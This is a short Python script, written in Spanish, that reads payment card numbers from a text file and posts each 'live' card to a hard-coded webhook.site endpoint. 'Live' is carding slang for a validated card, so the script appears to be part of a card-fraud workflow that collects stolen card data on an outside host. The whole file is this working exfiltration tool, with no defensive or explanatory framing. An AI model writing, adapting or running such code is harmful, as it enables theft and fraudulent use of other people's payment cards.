import requests

def enviar_live_a_la_web(tarjeta_live):
    webhook_url = "https://webhook.site/953e11d6-3f89-4645-8937-6c225a4b0d44"
    try:
        response = requests.post(webhook_url, json={"card": tarjeta_live})
        if response.ok:
            print(f"¡Enviada a la web correctamente! -> {tarjeta_live}")
        else:
            print(f"Error al enviar {tarjeta_live}: {response.status_code} - {response.text}")
    except Exception as e:
        print(f"Error al enviar {tarjeta_live}: {e}")

if __name__ == "__main__":
    try:
        with open("tarjetas.txt", "r") as archivo:
            for linea in archivo:
                tarjeta = linea.strip()
                if tarjeta:
                    enviar_live_a_la_web(tarjeta)
    except FileNotFoundError:
        print("El archivo 'tarjetas.txt' no existe. Crea el archivo y agrega las tarjetas, una por línea.")